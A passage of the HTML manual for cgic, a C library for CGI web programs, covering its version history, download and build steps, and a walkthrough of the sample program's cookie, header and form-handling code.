a saved CGI environment.\n<\/ul>\n<h3><a name=\"whatsnew201\">What's new in version 2.01?<\/a><\/h3>\n<ul>\n<li>Makefile supports \"make install\"\n<li>Compiles without warnings under both C and C++ with strict\nwarnings and strict ANSI compliance enabled\n<li>Builds out of the box on Windows (#include &lt;fcntl.h&gt; was needed)\n<li>Rare problem in cgiReadEnvironment corrected; no impact on\nnormal CGI operations\n<li>cgiCookieString now sets the result to an empty string\nwhen returning cgiFormNotFound\n<li>Minor code cleanups\n<\/ul>\n<h3><a name=\"whatsnew200\">What's new in version 2.0?<\/a><\/h3>\n1. CGIC 2.0 provides support for file upload fields. User-uploaded\nfiles are kept in temporary files, to avoid the use of\nexcessive swap space (Solaris users may wish to change the\n<code>cgicTempDir<\/code> macro in cgic.c before compiling).\nThe <code><a href=\"#cgiFormFileName\">cgiFormFileName<\/a><\/code>, \n<code><a href=\"#cgiFormFileContentType\">cgiFormFileContentType<\/a><\/code>, \n<code><a href=\"#cgiFormFileSize\">cgiFormFileSize<\/a><\/code>, \n<code><a href=\"#cgiFormFileOpen\">cgiFormFileOpen<\/a><\/code>, \n<code><a href=\"#cgiFormFileRead\">cgiFormFileRead<\/a><\/code>, and\n<code><a href=\"#cgiFormFileClose\">cgiFormFileClose<\/a><\/code> functions\nprovide a complete interface to this new functionality. Remember,\nthe <code>enctype<\/code> attribute of the <code>form<\/code> tag\nmust be set to <code>multipart\/form-data<\/code> when\n<code>&lt;input type=\"file\"&gt;<\/code> tags are used.\n<p>\n2. CGIC 2.0 provides support for setting and examining cookies\n(persistent data storage on the browser side).\nThe <code><a href=\"#cgiCookieString\">cgiCookieString<\/a><\/code>,\nand <code><a href=\"#cgiCookieInteger\">cgiCookieInteger<\/a><\/code>\nand <code><a href=\"#cgiCookies\">cgiCookies<\/a><\/code>\nfunctions retrieve cookies. The \n<code><a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a><\/code>\nand <code><a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger<\/a><\/code> functions set cookies.\n<p>\n3. CGIC 2.0 offers a convenient way to retrieve a list of all form fields.\nThe new <code><a href=\"#cgiFormEntries\">cgiFormEntries<\/a><\/code>\nfunction performs this operation.\n<p>\n4. CGIC 2.0 provides convenience functions to correctly escape\ntext before outputting it as part of HTML, or as part of the \nvalue of a tag attribute, such as the <code>HREF<\/code> or\n<code>VALUE<\/code> attribute. See \n<code><a href=\"#cgiHtmlEscape\">cgiHtmlEscape<\/a><\/code>,\n<code><a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData<\/a><\/code>,\n<code><a href=\"#cgiValueEscape\">cgiValueEscape<\/a><\/code> and\n<code><a href=\"#cgiValueEscapeData\">cgiValueEscapeData<\/a><\/code>.\n<p>\n5. Users have often asked the correct way to determine which submit\nbutton was clicked. This could always be accomplished in previous versions,\nbut CGIC 2.0 also provides \n<a href=\"#cgiFormSubmitClicked\">cgiFormSubmitClicked<\/a>,\na convenient alternate label for the \n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle<\/a> function.\n<h3><a name=\"whatsnew107\">What's new in version 1.07?<\/a><\/h3>\nA problem with the cgiFormString and related functions has been\ncorrected. These functions were previously incorrectly returning cgiFormTruncated\nin cases where the returned string fit the buffer exactly.\n<h3><a name=\"whatsnew106\">What's new in version 1.06?<\/a><\/h3>\n1. A potentially significant buffer overflow problem has been\ncorrected. Jon Ribbens correctly pointed out to me (and to the\nInternet's bugtraq mailing list) that the cgiFormEntryString\nfunction, which is used directly or indirectly by almost all\nCGIC programs, can potentially write past the buffer passed\nto it by the programmer. This bug has been corrected.\nUpgrading to version 1.06 is <strong>strongly recommended.<\/strong>\n<P>\n2. The function <code>cgiSaferSystem()<\/code> has been\nremoved entirely. This function escaped only a few metacharacters,\nwhile most shells have many, and there was no way to account for\nthe many different operating system shells that might be in use\non different operating systems. Since this led to a false sense\nof security, the function has been removed. It is our recommendation\nthat user input should never be passed directly on the command line\nunless it has been carefully shown to contain only characters\nregarded as safe and appropriate by the programmer. Even then, it is\nbetter to design your utilities to accept their input from standard\ninput rather than the command line.\n<h3><a name=\"whatsnew105\">What's new in version 1.05?<\/a><\/h3>\nNon-exclusive commercial license fee reduced to $200.\n<h3><a name=\"whatsnew104\">What's new in version 1.04?<\/a><\/h3>\nFor consistency with other packages, the standard Makefile\nnow produces a true library for cgic (libcgic.a). \n<h3><a name=\"whatsnew103\">What's new in version 1.03?<\/a><\/h3>\nVersion 1.03 sends line feeds only (ascii 10) to end \nContent-type:, Status:, and other HTTP protocol output lines,\ninstead of CR\/LF sequences. The standard specifies CR\/LF.\nUnfortunately, too many servers reject CR\/LF to make\nimplementation of that standard practical. No server\ntested ever rejects LF alone in this context. \n<h3><a name=\"whatsnew102\">What's new in version 1.02?<\/a><\/h3>\nVersion 1.02 corrects bugs in previous versions:\n<ul>\n<li>\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded<\/a> specified\nits arguments in the wrong order, with surprising results.\nThis bug has been corrected.\n<li>\nMany small changes have been made to increase compatibility.\ncgic now compiles with no warnings under the compilers\navailable at boutell.dev.\n<\/ul>\n<h3><a name=\"whatsnew101\">What's new in version 1.01?<\/a><\/h3>\nVersion 1.01 adds no major functionality but corrects \nsignificant bugs and incompatibilities:\n<ul>\n<li>\n<a href=\"#cgiFormInteger\">cgiFormInteger<\/a>,\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded<\/a>,\n<a href=\"#cgiFormDouble\">cgiFormDouble<\/a> and\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded<\/a> now\naccept negative numbers properly. They also accept positive\nnumbers with an explicit + sign.\n<li>Hex values containing the digit <code>9<\/code> are\nnow properly decoded.\n<li><a href=\"#cgiFormString\">cgiFormString<\/a> now\nrepresents each newline as a single line feed (ascii 10 decimal)\nas described in the documentation, not a carriage return\n(ascii 13 decimal) as in version 1.0. The latter approach\npleased no one.\n<li><a href=\"#cgiFormString\">cgiFormString<\/a> and\n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines<\/a>\nno longer erroneously return cgiFormEmpty in place of\ncgiFormSuccess.\n<li>The main() function of cgic now flushes standard output\nand sleeps for one second before exiting in order to inhibit\nproblems with the completion of I\/O on some platforms. This was\nnot a cgic bug per se, but has been reported as a common problem\nwith CGI when used with the CERN server. This change should\nimprove compatibility.\n<li>The single selection example in the testform.html\nexample now works properly. This was an error in the\nform itself, not cgic.\n<li><a href=\"#cgiRemoteUser\">cgiRemoteUser<\/a> and\n<a href=\"#cgiRemoteIdent\">cgiRemoteIdent<\/a> are now\ndocumented accurately. They were reversed earlier.\n<\/ul>\n<h3><a name=\"whatis\">What is cgic?<\/a><\/h3>\ncgic is an ANSI C-language library for the creation of CGI-based\nWorld Wide Web applications. For basic information about\nthe CGI standard, see the <a href=\"http:\/\/hoohoo.ncsa.uiuc.edu\/cgi\/\">\nCGI documentation<\/a> at NCSA.\n<p>\ncgic performs the following tasks:\n<ul>\n<li>Parses form data, correcting for defective and\/or inconsistent browsers\n<li>Transparently accepts both GET and POST form data\n<li>Accepts uploaded files as well as regular form fields\n<li>Provides functions to set and retrieve \"cookies\"\n(browser-side persistent information)\n<li>Handles line breaks in form fields in a consistent manner\n<li>Provides string, integer, floating-point, and single- and\nmultiple-choice functions to retrieve form data\n<li>Provides bounds checking for numeric fields\n<li>Loads CGI environment variables into C strings which are always non-null\n<li>Provides a way to capture CGI situations for replay in a debugging\nenvironment, including file uploads and cookies\n<\/ul>\n<p>\ncgic is compatible with any CGI-compliant server environment, and\ncompiles without modification in Posix\/Unix\/Linux and Windows\nenvironments.\n<h3><a name=\"obtain\">Obtaining cgic<\/a><\/h3>\ncgic is distributed via the web in two forms: as a Windows-compatible\n.ZIP file, and as a gzipped tar file. Most users of Windows and\nrelated operating systems have access to 'unzip' or 'pkunzip'. All modern Unix \nsystems come with 'gunzip' and 'tar' as standard equipment, and gzip\/gunzip\nis not difficult to find if yours does not. Versions\nof these programs for other operating systems are widely\navailable if you do not already have them.\n<p>\n<strong>Important:<\/strong> to use cgic, you will need an ANSI-standard\nC compiler. Under Unix, just obtain and use gcc. Most Unix systems have\nstandardiszed on gcc. Users of Windows operating systems should not have\nANSI C-related problems as all of the popular compilers follow the ANSI \nstandard.\n<p>\n<strong>Note for Windows Programmers:<\/strong> you must use a modern\n32-bit compiler. Visual C++ 2.0 or higher, Borland C++ and the\nmingw32 gcc compiler are all appropriate, as is cygwin. Do \n<strong>NOT<\/strong> use an ancient 16-bit DOS executable compiler, please.\n<blockquote>\n<h4>What Operating System Does Your WEB SERVER Run?<\/h4>\nRemember, the computer on your desk is usually NOT your web server.\nCompiling a Windows console executable will not give you a CGI program that\ncan be installed on a Linux-based server. \n<\/blockquote>\nYour web browser should inquire whether to save the file to disk\nwhen you select one of the links below. Under Unix and compatible\noperating systems, save it, then issue the following\ncommands to unpack it:\n<pre>\ngunzip cgic207.tar.gz\ntar -xf cgic207.tar\n<\/pre>\nThis should produce the subdirectory 'cgic207', which will contain\nthe complete cgic distribution for version 2.07, including a copy of this \ndocumentation in the file cgic.html.\n<p>\nUnder Windows and compatible operating systems, save it,\nopen a command prompt window, and issue the following commands to unpack it:\n<pre>\nunzip \/d cgic207.zip\n<\/pre>\nOr use the unzip utility of your choice.\n<p>\nThis command also produces the subdirectory 'cgic207', which will contain\nthe complete cgic distribution, including a copy of this \ndocumentation in the file cgic.html.\n<p>\ncgic is available via the web from www.boutell.dev:\n<ul>\n<li><a href=\"http:\/\/www.boutell.dev\/cgic\/cgic207.tar.gz\">Obtain cgic: gzipped tar file<\/a>\n<li><a href=\"http:\/\/www.boutell.dev\/cgic\/cgic207.zip\">Obtain cgic: .ZIP file<\/a>\n<\/ul>\n<h3><a name=\"build\">Building cgic: a sample application<\/a><\/h3>\nThe sample application 'cgictest.c' is provided as part of the\ncgic distribution. This CGI program displays an input form, \naccepts a submission, and then displays what was submitted.\nIn the process essentially all of cgic's features are tested.\n<p>\nOn a Unix system, you can build cgictest simply by typing\n'make cgictest.cgi'. cgic.c and cgictest.c will be compiled and linked\ntogether to produce the cgictest application. Under non-Unix\noperating systems, you will need to create and compile an appropriate\nproject containing the files cgic.c and cgictest.c. \n<p>\n<strong>IMPORTANT:<\/strong> after compiling cgictest.cgi, you will\nneed to place it in a location on your server system which is\ndesignated by your server administrator as an appropriate location\nfor CGI scripts. Some servers are configured to recognize any\nfile ending in .cgi as a CGI program when it is found in any\nsubdirectory of the server's web space, but this is not always\nthe case! The right locations for CGI\nprograms vary greatly from one server to another. Resolving\nthis issue is between you, your web server administrator,\nand your web server documentation. Before submitting a bug\nreport for cgic, make certain that the CGI example programs\nwhich came with your server <em>do<\/em> work for you. Otherwise\nit is very likely that you have a server configuration problem.\n<p>\nOnce you have moved cgictest.cgi (or cgictest.exe, under Windows)\nto an appropriate cgi directory,\nuse the web browser of your choice to access the URL at which\nyou have installed it \n(for instance, <code>www.mysite.com\/cgi-bin\/cgictest.cgi<\/code>).\nFill out the various fields in any manner you wish, then\nselect the SUBMIT button.\n<p>\nIf all goes well, cgictest.cgi will respond with a page which\nindicates the various settings you submitted. If not,\nplease reread the section above regarding the correct location in\nwhich to install your CGI program on your web server.\n<h3><a name=\"nocompile\">What to do if it won't compile<\/a><\/h3>\n<ul>\n<li><strong>Are you using Visual C++ or Borland C++? Did you forget to add\ncgic.c to your project?<\/strong>\n<li><strong>Make sure you are using an ANSI C or C++ compiler.<\/strong>\n(All of the Windows compilers are ANSI C compliant.)\n<\/ul>\nIf none of the above proves effective, please see the\nsection regarding <a href=\"#support\">support<\/a>.\n<h3><a name=\"howto\">How to write a cgic application<\/a><\/h3>\n<em>Note: <\/em> All cgic applications must be linked to the cgic.c module\nitself. How to do this depends on your operating system; under Unix,\njust use the provided Makefile as an example.\n<p>\nSince all CGI applications must perform certain initial\ntasks, such as parsing form data and examining\nenvironment variables, the cgic library provides its\nown main() function. When you write applications that\nuse cgic, you will begin your own programs by writing\na cgiMain() function, which cgic will invoke when\nthe initial cgi work has been successfully completed. Your\nprogram must also be sure to #include the file cgic.h.\n<p>\n<strong>Important:<\/strong> if you write your own main()\nfunction, your program will not link properly. Your own\ncode should begin with cgiMain(). The library\nprovides main() for you. (Those who prefer different behavior\ncan easily modify cgic.c.)\n<p>\nConsider the cgiMain function of cgictest.c:\n<p>\n<PRE>\nint cgiMain() {\n#ifdef DEBUG\n  LoadEnvironment();\n#endif \/* DEBUG *\/\n  \/* Load a previously saved CGI scenario if that button\n    has been pressed. *\/\n  if (cgiFormSubmitClicked(\"loadenvironment\") == cgiFormSuccess) {\n    LoadEnvironment();\n  }\n  \/* Set any new cookie requested. Must be done *before*\n    outputting the content type. *\/\n  CookieSet();\n  \/* Send the content type, letting the browser know this is HTML *\/\n  cgiHeaderContentType(\"text\/html\");\n  \/* Top of the page *\/\n  fprintf(cgiOut, \"&lt;HTML&gt;&lt;HEAD&gt;\\n\");\n  fprintf(cgiOut, \"&lt;TITLE&gt;cgic test&lt;\/TITLE&gt;&lt;\/HEAD&gt;\\n\");\n  fprintf(cgiOut, \"&lt;BODY&gt;&lt;H1&gt;cgic test&lt;\/H1&gt;\\n\");\n  \/* If a submit button has already been clicked, act on the \n    submission of the form. *\/\n  if ((cgiFormSubmitClicked(\"testcgic\") == cgiFormSuccess) ||\n    cgiFormSubmitClicked(\"saveenvironment\") == cgiFormSuccess)\n  {\n    HandleSubmit();\n    fprintf(cgiOut, \"&lt;hr&gt;\\n\");\n  }\n  \/* Now show the form *\/\n  ShowForm();\n  \/* Finish up the page *\/\n  fprintf(cgiOut, \"&lt;\/BODY&gt;&lt;\/HTML&gt;\\n\");\n  return 0;\n}\n<\/PRE>\nNote the DEBUG #ifdef. If DEBUG is defined at compile time, either by\ninserting the line \"#define DEBUG 1\" into the program or by setting\nit in the Makefile or other development environment, then the\nLoadEnvironment function is invoked. This function calls \n<a href=\"#cgiReadEnvironment\">cgiReadEnvironment()<\/a> \nto restore a captured CGI environment for debugging purposes. See\nalso the discussion of the <a href=\"#debug\">capture<\/a> program, which is\nprovided for use in CGI debugging. Because this is a test program,\nthe <a href=\"#cgiFormSubmitClicked\">cgiFormSubmitClicked<\/a> function is\nalso called to check for the use of a button that requests the reloading\nof a saved CGI environment. A completed CGI program typically would\nnever allow the end user to make that decision.\n<h4>Setting Cookies<\/h4>\nNext, one of the cgiHeader functions should be called.\nThis particular program demonstrates many features, including\nthe setting of cookies. If the programmer wishes to set a cookie,\nthe cookie-setting function must be called\nfirst, before other headers are output. This is done by the\nCookieSet() function of cgictest.c:\n<pre>\nvoid CookieSet()\n{\n  char cname[1024];\n  char cvalue[1024];\n  \/* Must set cookies BEFORE calling \n    cgiHeaderContentType *\/\n  cgiFormString(\"cname\", cname, sizeof(cname));  \n  cgiFormString(\"cvalue\", cvalue, sizeof(cvalue));  \n  if (strlen(cname)) {\n    \/* Cookie lives for one day (or until \n      browser chooses to get rid of it, which \n      may be immediately), and applies only to \n      this script on this site. *\/  \n    cgiHeaderCookieSetString(cname, cvalue,\n      86400, cgiScriptName, cgiServerName);\n  }\n}\n<\/pre>\nSince this is a test program, the <a href=\"#cgiFormString\">cgiFormString<\/a> \nfunction is used to fetch the name and value from the form previously filled\nin by the user. Normally, cookie names and values are chosen to meet the\nneeds of the programmer and provide a means of identifying the same\nuser again later.\n<p>\nThe <a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString<\/a>\nfunction sets the cookie by requesting that the web browser store it.\n<strong>There is never any guarantee that this will happen!<\/strong>\nMany browsers reject cookies completely; others do not necessarily keep\nthem as long as requested or return them with their values intact.\nAlways code defensively when using cookies.\n<p>\nThe cname and cvalue parameters are of course the namd and value for\nthe cookie. The third argument is the time, in seconds, that the\ncookie should \"live\" on the browser side before it expires; in this\ncase it has been set to 86,400 seconds, which is exactly one day. \n<strong>The browser may or may not respect this setting, as with everything\nelse about cookies.<\/strong>\n<p>\nThe fourth argument identifies the \"path\" within the web site for which\nthe cookie is considered valid. A cookie that should be sent back\nfor every access to the site should be set with a path of <code>\/<\/code>.\nIn this case the cookie is relevant only to the CGI program itself, so\n<code><a href=\"#cgiScriptName\">cgiScriptName<\/a><\/code> (the URL of the CGI program, not including the\ndomain name) is sent. Similarly, a cookie can be considered relevant\nto a single web site or to an entire domain, such as \n<code>www.boutell.dev<\/code> or the entire <code>.boutell.dev<\/code>\ndomain. In this case, the current site on which the program is running\nis the only relevant site, so <code><a href=\"#cgiServerName\">cgiServerName<\/a><\/code> is used\nas the domain.\n<h4>Outputting the Content Type Header<\/h4>\nNext, <a href=\"#cgiHeaderContentType\">cgiHeaderContentType()<\/a> is \ncalled to indicate the MIME type of the document being output, in this case \n\"text\/html\" (a normal HTML document). A few other common MIME types are\n\"image\/gif\", \"image\/jpeg\" and \"audio\/wav\". \n<p>\nNote that <a href=\"#cgiHeaderStatus\">cgiHeaderStatus()<\/a> or \n<a href=\"#cgiHeaderLocation\">cgiHeaderLocation()<\/a> could have\nbeen invoked instead to output an error code or redirect the\nrequest to a different URL. Only one of the cgiHeader functions\nshould be called in a single execution of the program.\n<p>\n<strong>Important:<\/strong> one of the cgiHeader functions,\nusually <a href=\"#cgiHeaderContentType\">cgiHeaderContentType()<\/a>, \n<em>must<\/em> be invoked before outputting any other\nresponse to the user. Otherwise, the result will not be a valid\ndocument and the browser's behavior will be unpredictable.\nYou may, of course, output your own ContentType and other\nheader information to <a href=\"#cgiOut\">cgiOut<\/a> if you prefer. The cgiHeader functions\nare provided as a convenience.\n<h4>Handling Form Submissions<\/h4>\nLike many CGI programs, cgictest makes decisions about the way it\nshould behave based on whether various submit buttons have been clicked.\nWhen either the testcgic or saveenvironment button is present, cgictest\ninvokes the HandleSubmit function, which invokes additional functions to\nhandle various parts of the form:\n<pre>\nvoid HandleSubmit()\n{\n  Name();\n  Address();\n  Hungry();\n  Temperature();\n  Frogs();\n  Color();\n  Flavors();\n  NonExButtons();\n  RadioButtons();\n  File();\n  Entries();\n  Cookies();\n  \/* The saveenvironment button, in addition to submitting \n    the form, also saves the resulting CGI scenario to \n    disk for later replay with the 'load saved environment' \n    button. *\/\n  if (cgiFormSubmitClicked(\"saveenvironment\") == cgiFormSuccess) {\n    SaveEnvironment();\n  }\n}\n<\/pre>\n<h4>Handling Text Input<\/h4>\nThe Name() function of cgictest is shown below, in its simplest\npossible form:\n<PRE>\nvoid Name() {\n        char name[81];\n        <a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines<\/a>(\"name\", name, 81);\n        fprintf(cgiOut, \"Name: \");\n        cgicHtmlEscape(name);\n        fprintf(cgiOut, \"<BR>\\n\");\n}\n<\/PRE>\nThe purpose of this function is to retrieve and display the name that was\ninput by the user. Since the programmer has decided that names should\nbe permitted to have up to 80 characters, a buffer of 81 characters\nhas been declared (allowing for the final null character). \nThe <a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()<\/a>\nfunction is then invoked to retrieve the name and ensure that\ncarriage returns are not present in the name (despite the\nincorrect behavior of some web browsers). The first argument\nis the name of the input field in the form, the second argument\nis the buffer to which the data should be copied, and the third\nargument is the size of the buffer. cgic will never write beyond\nthe size of the buffer, and will always provide a null-terminated\nstring in response; if the buffer is too small, the string will\nbe shortened. If this is not acceptable, the\n<a href=\"#cgiFormStringSpaceNeeded\">cgiFormStringSpaceNeeded()<\/a>\nfunction can be used to check the amount of space needed; the\nreturn value of cgiFormStringNoNewlines() can also be checked\nto determine whether truncation occurred. See\nthe full description of <a href=\"#cgiFormStringNoNewlines\">\ncgiFormStringNoNewlines()<\/a>.\n<h4>Handling Output<\/h4>\nNote that Name() writes its HTML output to <a href=\"#cgiOut\">cgiOut<\/a>, not\nto stdout.\n<p>\nThe actual name submitted by the user may or may not contain\ncharacters that have special meaning in HTML, specifically the\nthe <code>&lt;<\/code>, <code>&gt;<\/code>, and <code>&amp;<\/code> characters.\nThe <a href=\"#cgiHtmlEscape\">cgiHtmlEscape<\/a> function is used to output\nthe user-entered name with any occurrences of these characters\ncorrectly escaped as <code>&amp;lt;<\/code>, <code>&amp;gt;<\/code>, \nand <code>&amp;amp;<\/code>.\n<p>\n<strong>Important:<\/strong> <a href=\"#cgiOut\">cgiOut<\/a> is normally equivalent\nto stdout, and there is no performance penalty for using it.\nIt is recommended that you write output to <a href=\"#cgiOut\">cgiOut<\/a> to ensure compatibility\nwith modified versions of the cgic library for special\nenvironments that do not provide stdin and stdout for\neach cgi connection.\n<p>\nNote that, for text input areas in which carriage returns <em>are<\/em>\ndesired, the function <a href=\"#cgiFormString\">cgiFormString<\/a>\nshould be used instead. cgiFormString ensures that line breaks\nare always represented by a single carriage return (ascii decimal 13),\nmaking life easier for the programmer. See the source code to\nthe Address() function of cgictest.c for an example.\n<h4>Handling Single Checkboxes<\/h4>\nConsider the Hungry() function, which determines whether\nthe user has selected the \"hungry\" checkbox:\n<PRE>\nvoid Hungry() {\n        if (<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle<\/a>(\"hungry\") == <a href=\"#cgiFormSuccess\">cgiFormSuccess<\/a>) {\n                fprintf(cgiOut, \"I'm Hungry!&lt;BR&gt;\\n\");\n        } else {\n                fprintf(cgiOut, \"I'm Not Hungry!&lt;BR&gt;\\n\");\n        }\n}\n<\/PRE>\nThis function takes advantage of the\n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle()<\/a> function, which\ndetermines whether a single checkbox has been selected. \ncgiFormCheckboxSingle() accepts the name attribute of the checkbox\nas its sole argument and returns <a href=\"#cgiFormSuccess\">\ncgiFormSuccess<\/a> if the checkbox is selected, or \n<a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a> if it is not.\nIf multiple checkboxes with the same name are in use,\nconsider the <a href=\"#cgiFormCheckboxMultiple\">\ncgiFormCheckboxMultiple()<\/a> and \n<a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple()<\/a>\nfunctions.\n<h4>Handling Numeric Input<\/h4>\nNow consider the Temperature() function, which retrieves\na temperature in degrees (a floating-point value) and ensures\nthat it lies within particular bounds:\n<PRE>\nvoid Temperature() {\n        double temperature;\n        <a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded<\/a>(\"temperature\", &amp;temperature, 80.0, 120.0, 98.6);\n        fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"My temperature is %f.&lt;BR&gt;\\n\", temperature);\n}\n<\/PRE>\nThe temperature is retrieved by the function \n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded()<\/a>. The first\nargument is the name of the temperature input field in the form;\nthe second argument points to the address of the variable that will \ncontain the result. The next two arguments are the lower and upper\nbounds, respectively. The final argument is the default value to\nbe returned if the user did not submit a value.\n<p>\nThis function always retrieves a reasonable value within the\nspecified bounds; values above or below bounds are constrained\nto fit the bounds. However, the return value of\ncgiFormDoubleBounded can be checked to make sure the\nactual user entry was in bounds, not blank, and so forth;\nsee the description of <a href=\"#cgiFormDoubleBounded\">\ncgiFormDoubleBounded()<\/a> for more details. If bounds checking\nis not desired, consider using <a href=\"#cgiFormDouble\">\ncgiFormDouble()<\/a> instead.\n<p>\nNote that, for integer input, the functions\n<a href=\"#cgiFormInteger\">cgiFormInteger<\/a> and\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded<\/a>\nare available. The behavior of these functions is similar to\nthat of their floating-point counterparts above.\n<h4>Handling Single-Choice Input<\/h4>\nThe &lt;SELECT&gt; tag of HTML is used to provide the user with\nseveral choices. Radio buttons and checkboxes can also be used\nwhen the number of choices is relatively small. Consider\nthe Color() function of cgictest.c:\n<PRE>\nchar *colors[] = {\n        \"Red\",\n        \"Green\",\n        \"Blue\"\n};\n\nvoid Color() {\n        int colorChoice;\n        <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle<\/a>(\"colors\", colors, 3, &amp;colorChoice, 0);\n        fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"I am: %s&lt;BR&gt;\\n\", colors[colorChoice]);\n}\n<\/PRE>\nThis function determines which of several colors the user chose\nfrom a &lt;SELECT&gt; list in the form. An array of colors is\ndeclared; the <a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()<\/a>\nfunction is then invoked to determine which, if any, of those choices\nwas selected. The first argument indicates the name of the input\nfield in the form. The second argument points to the list of\nacceptable colors. The third argument indicates the number of\nentries in the color array. The fourth argument points to the\nvariable which will accept the chosen color, and the last argument\nindicates the index of the default value to be set if no\nselection was submitted by the browser. \n<p>\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()<\/a> will\nalways indicate a reasonable selection value. However, if\nthe programmer wishes to know for certain that a value was\nactually submitted, that the value submitted was a legal\nresponse, and so on, the return value of cgiFormSelectSingle()\ncan be consulted. See the full description of\n<a href=\"#cgiFormSelectSingle\">cgiFormSelectSingle()<\/a> for\nmore information.\n<p>\nNote that radio button groups and &lt;SELECT&gt; lists can both\nbe handled by this function. If you are processing radio\nbutton groups, you may prefer to invoke \n<a href=\"#cgiFormRadio\">cgiFormRadio()<\/a>, which functions\nidentically. \n<p>\n<em>\"What if I won't know the acceptable choices at runtime?\"<\/em>\n<p>\nIf the acceptable choices aren't known <em>until<\/em> runtime,\none can simply load the choices from disk. But if the acceptable\nchoices aren't fixed at all (consider a list of country names;\nnew names may be added to the form at any time and it is\ninconvenient to also update program code or a separate list\nof countries), simply invoke \n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines()<\/a>\ninstead to retrieve the string directly. Keep in mind that, if\nyou do so, validating the response to make sure it is\nsafe and legitimate becomes a problem for your own\nprogram to solve. The advantage of cgiFormSelectSingle() is that invalid \nresponses are never returned.\n<p>\nTo handle multiple-selection &lt;SELECT&gt; lists and\ngroups of checkboxes with the same name, see the\ndiscussion of the NonExButtons() function of cgictest.c, immediately below.\n<h4>Handling Multiple-Choice Input<\/h4>\nConsider the first half of the NonExButtons() function of cgictest.c:\n<PRE>\nchar *votes[] = {\n  \"A\",\n  \"B\",\n  \"C\",\n  \"D\"\n};\n\nvoid NonExButtons() {\n  int voteChoices[4];\n  int i;\n  int result;  \n  int invalid;\n\n  char **responses;\n\n  \/* Method #1: check for valid votes. This is a good idea,\n    since votes for nonexistent candidates should probably\n    be discounted... *\/\n  fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"Votes (method 1):&lt;BR&gt;\\n\");\n  result = <a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple<\/a>(\"vote\", votes, 4, \n    voteChoices, &amp;invalid);\n  if (result == <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>) {\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"I hate them all!&lt;p&gt;\\n\");\n  } else {  \n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"My preferred candidates are:\\n\");\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"&lt;ul&gt;\\n\");\n    for (i=0; (i &lt; 4); i++) {\n      if (voteChoices[i]) {\n        fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"&lt;li&gt;%s\\n\", votes[i]);\n      }\n    }\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"&lt;\/ul&gt;\\n\");\n  }\n<\/PRE>\nThis function takes advantage of\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple()<\/a>,\nwhich is used to identify one or more selected checkboxes with \nthe same name. This function performs identically to\n<a href=\"#cgiFormSelectMultiple\">cgiFormSelectMultiple()<\/a>.\nThat is, &lt;SELECT&gt; tags with the MULTIPLE attribute are handled\njust like a group of several checkboxes with the same name.\n<p>\nThe first argument to <a href=\"#cgiFormCheckboxMultiple\">\ncgiFormCheckboxMultiple()<\/a> is the name given to all\ncheckbox input fields in the group. The second argument\npoints to an array of legitimate values; these should\ncorrespond to the VALUE attributes of the checkboxes\n(or OPTION tags in a &lt;SELECT&gt; list). The third argument\nindicates the number of entries in the array of\nlegitimate values. The fourth argument points to\nan array of integers with the same number of entries\nas the array of legitimate values; each entry\nwill be set true if that checkbox or option was selected,\nfalse otherwise.\n<p>\nThe last argument points to an integer which will be set to the \nnumber of invalid responses (responses not in the array of\nvalid responses) that were submitted. If this value is not\nof interest, the last argument may be a null pointer (0).\n<p>\nNote that the return value of cgiFormCheckboxMultiple is\ninspected to determine whether any choices at all were\nset. See the full description of\n<a href=\"#cgiFormCheckboxMultiple\">cgiFormCheckboxMultiple<\/a>\nfor other possible return values. \n<p>\n<em>\"What if I won't know the acceptable choices at runtime?\"<\/em>\n<p>\nIf the acceptable choices aren't known <em>until<\/em> runtime,\none can simply load the choices from disk. But if the acceptable\nchoices aren't fixed at all (consider a list of ice cream flavors;\nnew names may be added to the form at any time and it is\ninconvenient to also update program code or a separate list\nof countries), a more dynamic approach is needed. Consider\nthe second half of the NonExButtons() function of cgictest.c:\n<PRE>\n  \/* Method #2: get all the names voted for and trust them.\n    This is good if the form will change more often\n    than the code and invented responses are not a danger\n    or can be checked in some other way. *\/\n  fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"Votes (method 2):&lt;BR&gt;\\n\");\n  result = <a href=\"#cgiFormStringMultiple\">cgiFormStringMultiple<\/a>(\"vote\", &amp;responses);\n  if (result == <a href=\"#cgiFormNotFound\">cgiFormNotFound<\/a>) {  \n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"I hate them all!&lt;p&gt;\\n\");\n  } else {\n    int i = 0;\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, \"My preferred candidates are:\\n\");\n    fprintf(<a href=\"#cgiOut\">cgiOut<\/a>, 